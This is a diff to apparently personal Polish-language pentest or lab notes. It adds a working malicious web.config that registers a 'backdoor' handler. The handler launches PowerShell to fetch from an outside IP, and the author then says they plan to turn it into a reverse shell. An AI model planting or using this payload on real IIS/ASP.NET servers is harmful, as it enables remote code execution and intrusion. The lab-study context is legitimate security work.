@@ -85,6 +85,26 @@ o mmay write tam gdzie jest web.config
 
 trochę czytania `https://soroush.me/blog/tag/rce/`.
 
+![{F55B628E-B2CD-4D5B-8BF1-1C6357B98BFA}](https://github.com/user-attachments/assets/1a869344-656c-4b85-b154-4c1026d40c81)
+
+po prawie 2h udało mi się... je jebe.
+```
+<?xml version="1.0" encoding="utf-8"?>
+<configuration>
+  <location path="." inheritInChildApplications="false">
+    <system.webServer>
+      <handlers>
+        <add name="aspNetCore" path="backdoor" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
+      </handlers>
+      <aspNetCore processPath="powershell.exe" arguments='/c IWR http://10.8.4.124/' stdoutLogEnabled="false" stdoutLogFile=".\logs\stdout" hostingModel="OutOfProcess" />
+    </system.webServer>
+  </location>
+</configuration>
+<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
+```
+TO DZIAŁA. Czas przerobić to na rev shella
+
+
 
 
 
